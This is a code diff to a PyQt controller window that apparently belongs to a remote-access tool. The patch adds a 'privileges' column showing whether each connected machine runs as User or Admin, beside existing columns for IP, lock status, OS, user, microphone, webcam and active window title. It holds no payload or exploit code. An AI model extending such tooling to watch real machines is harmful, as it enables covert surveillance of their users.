@@ -109,20 +109,22 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_ipAddress = 0
         self.index_of_alias = 1
         self.index_of_socket = 2
-        self.index_of_lock = 3
-        self.index_of_os = 4
-        self.index_of_user = 5
-        self.index_of_microphone = 6
-        self.index_of_webcamera = 7
-        self.index_of_activeWindowTitle = 8
+        self.index_of_os = 3
+        self.index_of_user = 4
+        self.index_of_privs = 5
+        self.index_of_lock = 6
+        self.index_of_microphone = 7
+        self.index_of_webcamera = 8
+        self.index_of_activeWindowTitle = 9
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
         self.serversTable.setColumnWidth(self.index_of_socket, 50)
-        self.serversTable.setColumnWidth(self.index_of_lock, 90)
         self.serversTable.setColumnWidth(self.index_of_os, 90)
         self.serversTable.setColumnWidth(self.index_of_user, 90)
-        self.serversTable.setColumnWidth(self.index_of_microphone, 50)
-        self.serversTable.setColumnWidth(self.index_of_webcamera, 50)
+        self.serversTable.setColumnWidth(self.index_of_privs, 60)
+        self.serversTable.setColumnWidth(self.index_of_lock, 85)
+        self.serversTable.setColumnWidth(self.index_of_microphone, 45)
+        self.serversTable.setColumnWidth(self.index_of_webcamera, 45)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_server)
         # Initializing right click menu
@@ -258,6 +260,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     self.socks[socket_index]['protection'] = info['protection']
                     self.socks[socket_index]['os'] = info['os']
                     self.socks[socket_index]['user'] = info['user']
+                    self.socks[socket_index]['privileges'] = info['privileges']
                     self.socks[socket_index]['inputdevice'] = info['inputdevice']
                     self.socks[socket_index]['webcamdevice'] = info['webcamdevice']
                     self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']
@@ -296,6 +299,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                         info = ast.literal_eval(data)
                         self.streaming_socks[i]['protection'] = info['protection']
                         self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
+                        self.streaming_socks[i]['privileges'] = info['privileges']
                     except (socket.error, SyntaxError):
                         del self.socks[i]
                         del self.streaming_socks[i]
@@ -372,6 +376,28 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_socket, item)
 
+                # add os version
+                item = QTableWidgetItem(self.socks[obj]['os'])
+                item.setIcon(QIcon(os.path.join(assets, os_icon(self.socks[obj]['ostype']))))
+                self.serversTable.setItem(index, self.index_of_os, item)
+
+                # add server user
+                item = QTableWidgetItem(self.socks[obj]['user'])
+                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
+                self.serversTable.setItem(index, self.index_of_user, item)
+
+                # add user privileges
+                item = QTableWidgetItem()
+
+                privs_status = 'User' if not self.streaming_socks[obj]['privileges'] == '1' else 'Admin'
+                if privs_status == 'Admin':
+                    item.setIcon(QIcon(os.path.join(assets, 'true.png')))
+                else:
+                    item.setIcon(QIcon(os.path.join(assets, 'false.png')))
+                item.setText(privs_status)
+                self.serversTable.setItem(index, self.index_of_privs, item)
+
+
                 # add server lock status
                 lock_status = 'LOCKED' if self.streaming_socks[obj]['protection'] == 'False' else 'UNLOCKED'
                 item = QTableWidgetItem(lock_status)
@@ -383,34 +409,25 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                 self.serversTable.setItem(index, self.index_of_lock, item)
 
-                # add os version
-                item = QTableWidgetItem(self.socks[obj]['os'])
-                item.setIcon(QIcon(os.path.join(assets, os_icon(self.socks[obj]['ostype']))))
-                self.serversTable.setItem(index, self.index_of_os, item)
-
-                # add server user
-                item = QTableWidgetItem(self.socks[obj]['user'])
-                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
-                self.serversTable.setItem(index, self.index_of_user, item)
 
                 # add input device
                 item = QTableWidgetItem()
                 if self.socks[obj]['inputdevice'] == 'NoDevice':
-                    item.setText('No')
                     item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
+                    item.setText('No')
                 else:
-                    item.setText('Yes')
                     item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
+                    item.setText('Yes')
                 self.serversTable.setItem(index, self.index_of_microphone, item)
 
                 # add webcam device
                 item = QTableWidgetItem()
                 if self.socks[obj]['webcamdevice'] == 'NoDevice':
-                    item.setText('No')
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
+                    item.setText('No')
                 else:
-                    item.setText('Yes')
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
+                    item.setText('Yes')
                 self.serversTable.setItem(index, self.index_of_webcamera, item)
 
                 # add active windows title
